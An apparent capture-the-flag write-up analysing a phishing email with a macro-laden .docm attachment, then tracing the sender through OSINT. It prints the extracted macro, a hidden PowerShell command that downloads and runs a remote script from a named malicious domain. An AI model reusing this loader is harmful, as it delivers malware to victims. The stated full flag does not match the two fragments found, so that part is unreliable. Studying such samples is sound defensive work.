### InfraBroken :

# Description :

>An attacker sends a phishing email disguised as a legitimate notification about a package arrival. The email instructs the recipient to click on a link to view an invoice and product details, which is actually a malicious attempt to steal sensitive information or install malware on the victim's machine !!!

> Author : Mr_Togoo

> Attachments : [crime.eml](https://www.mediafire.com/file/lcso0oy3pjqo3kd/crime.eml/file)

During the analysis of the email, we identified the user who sent the email and the link to the document.



    1- user : aymanetogoo@gmail.com
    2- document : Product_details.docm


[![email.png](https://i.postimg.cc/Gpxs9f2c/email.png)](https://postimg.cc/zL3fc0KM)



    We installed the document Product_details.docm and analyzed it with 'olevba'.



[![Product.png](https://i.postimg.cc/tRZWN2vz/Product.png)](https://postimg.cc/hhnXSbBJ)


We obtained this output:

`Set objShell = CreateObject("WScript.Shell")
`objShell.Run "cmd.exe /c powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command iex (New-Object Net.WebClient).DownloadString('http://bericht-belastingdienst.com/good_news.vbs')", 0, False`

1. When checking the reputation of the domain bericht-belastingdienst.com, we found it to be very malicious.

[![virustotal.png](https://i.postimg.cc/CKzWx3J8/virustotal.png)](https://postimg.cc/d7cWWSbQ)
And here, we obtained the first part of the flag.

`CSP{5om3tim35_th3_thing5`


2. Now, we need to check the user who sent the email and perform some OSINT to see if they have other social media accounts.
   
   

[![github.png](https://i.postimg.cc/XJ5mw9R7/github.png)](https://postimg.cc/9RWL2wXv)
3. So, he has a GitHub account and a repository named `Important`
   

[![github2.png](https://i.postimg.cc/pd43hs16/github2.png)](https://postimg.cc/d7R5gjF2)

[![github3.png](https://i.postimg.cc/T1XSQpxj/github3.png)](https://postimg.cc/62YYp6yT)
4.  When you enter GitHub, you don't find the flag immediately. You need to check the history of the comments to find it.

   `_4r3_34Sy_but_l4h_yhdin4}`

5. So, the full flag is

FLAG : 
>CSP{DN5_G00D_T0_3XF1L7R3_V1A_53CUR3_CH4NN3L5_4ND_L4H_YT9ABL_SY4MNA}

**Note** : These pieces of information were not found because I removed my comment in VirusTotal and the user on GitHub.
